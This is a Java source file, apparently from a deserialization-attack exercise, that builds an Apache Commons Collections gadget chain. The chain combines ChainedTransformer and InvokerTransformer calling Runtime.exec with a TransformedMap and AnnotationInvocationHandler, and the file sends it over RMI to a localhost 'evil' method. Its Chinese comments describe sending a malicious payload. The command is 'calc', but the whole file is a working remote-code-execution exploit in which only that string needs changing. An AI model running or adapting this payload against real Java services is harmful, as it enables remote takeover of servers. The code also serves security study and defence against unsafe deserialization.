import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.rmi.Naming;
import java.util.HashMap;
import java.util.Map;

public class ClientAttackServer {
    public static void main(String[] args) throws Exception {
        // 连接服务端
        RemoteObj r = (RemoteObj) Naming.lookup("rmi://127.0.0.1:1099/Hello");
        // 发送恶意payload到服务端的evil方法
        r.evil(getPayload());
    }

    public static Object getPayload() throws Exception {
        String command = "calc";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{command})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","value");
        Map decorator = TransformedMap.decorate(map,null,chainedTransformer);
        Class<?> annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object annotationInvocationHandler = annotationInvocationHandlerConstructor.newInstance(Target.class,decorator);
        return annotationInvocationHandler;
    }
}